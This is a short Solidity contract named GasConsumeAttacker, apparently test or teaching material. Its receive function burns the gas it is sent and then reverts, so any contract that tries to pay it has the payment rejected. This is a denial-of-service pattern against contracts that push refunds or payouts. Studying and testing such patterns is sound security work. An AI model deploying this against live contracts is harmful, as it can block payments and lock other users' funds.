pragma solidity ^0.8.0;

contract GasConsumeAttacker {
    address public constant owner = address(0xA9E);

    receive() external payable {
       uint256 gasUsed;
       while(gasleft() > 2300) {
            gasUsed = gasleft();
        }
        revert();
    }
}